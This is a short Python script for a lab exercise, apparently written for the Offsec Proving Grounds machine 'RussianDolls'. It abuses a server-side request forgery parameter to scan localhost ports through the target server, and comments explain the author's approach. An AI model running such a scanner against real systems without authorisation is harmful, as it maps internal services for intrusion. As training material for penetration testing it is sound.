#!/usr/bin/python3
# URL fuzzer written for Offsec Proving Grounds machine "RussianDolls"
# # NOTE: The server first appears to be vulnerable to RFI but I couldn't seem to
# take advantage of that. Because of the way the url is accessing local resources
# I decided to scan for ports only open on the local machine to see if we could
# take advantage that way. Doing all 65535 port is pretty slow but you can just 
# change loop iteration if you would like. 
#
# Written by Rob Flemen
# Author Github: https://github.com/rflemen
# Author YouTube: https://www.youtube.com/@RobFlemen 
# 12/31/2025

import requests
import argparse
from collections import Counter

# Example usage:
# python3 scan_url.py --url http://192.168.165.113:8080/image?image=http://localhost

# Set up arguments
parser = argparse.ArgumentParser(description="Fuzzes a base SSRF URL for non-500 responses.")
parser.add_argument("--url", required=True, help="Base SSRF URL (e.g., http://target/image?image=http://localhost)")
parser.add_argument("--range", type=int, default=10000, help="Port range to scan (default: 0–9999)")
parser.add_argument("--timeout", type=float, default=3.0, help="Request timeout in seconds (default: 3)")
args = parser.parse_args()


### BANNER ###
print("SCRiPT By:                 ")
print("        ,------.           ")            
print(",--,--, |  .--. ',--,--,--.") 
print("|      ;|  '--' ||        |") 
print("|  ||  ||  | --' |  |  |  |") 
print("`--''--'`--'     `--`--`--'")                            
print("URL Fuzzer for SSRF - PG Machine: RussianDolls") 
print(f"Target URL base: {args.url}")
print("Starting scan...\n")


### SCAN ###
open_count = 0
status_counts = Counter()

for port in range(args.range):
    target_url = f"{args.url}:{port}"
    try:
        response = requests.get(target_url, timeout=args.timeout)
        code = response.status_code
        status_counts[code] += 1

        # Show anything not 500
        if code != 500:
            open_count += 1
            print(f"[\033[92m✓\033[00m] Port {port} --> Status: \033[92m{code}\033[00m")
    except requests.exceptions.Timeout:
        status_counts["timeout"] += 1
    except requests.exceptions.RequestException as e:
        status_counts["error"] += 1


### PRINT SUMMARY ###
print("\nScan complete!")
print(f"Ports tested: {args.range}")
print(f"Non-500 responses (likely interesting): \033[92m{open_count}\033[00m\n")

print("Response code summary:")
for code, count in status_counts.items():
    print(f"  {code}: {count} responses")
